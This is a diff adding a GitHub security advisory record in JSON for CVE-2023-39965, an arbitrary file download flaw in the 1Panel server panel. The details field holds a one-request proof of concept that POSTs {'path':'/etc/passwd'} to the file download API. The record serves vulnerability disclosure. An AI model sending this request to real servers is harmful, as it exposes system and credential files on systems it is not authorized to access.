@@ -1,0 +1,68 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-85cf-gj29-f555",
+  "modified": "2023-08-10T20:09:24Z",
+  "published": "2023-08-10T20:09:24Z",
+  "aliases": [
+    "CVE-2023-39965"
+  ],
+  "summary": "1Panel Arbitrary File Download vulnerability",
+  "details": "### Summary\nAny file downloading vulnerability exists in 1Panel backend.\n\n### Details\nAuthenticated attackers can download arbitrary files through the API interface. This code has unauthorized access.\n![image](https://user-images.githubusercontent.com/116613486/257246024-d0e35800-5fd8-4907-8b1b-504afaad859e.png)\n\n### PoC\npayload:\n\nPOST /api/v1/files/download/bypath HTTP/1.1\nHost: ip\nContent-Type: application/json\n\n{\"path\":\"/etc/passwd\"}\n\n![f77959349e96543436eea18283fa75c](https://user-images.githubusercontent.com/116613486/257245459-13f2f31b-fcfe-4a27-ba52-e2f1e5d4d749.png)\n\n\n### Impact\nAttackers can freely download the file content on the target system. This will be caused a large amount of information leakage.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/1Panel-dev/1Panel"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.4.3"
+            },
+            {
+              "fixed": "1.5.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.4.3"
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-85cf-gj29-f555"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39965"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/1Panel-dev/1Panel"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/1Panel-dev/1Panel/releases/tag/v1.5.0"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-863"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-08-10T20:09:24Z",
+    "nvd_published_at": "2023-08-10T18:15:11Z"
+  }
+}
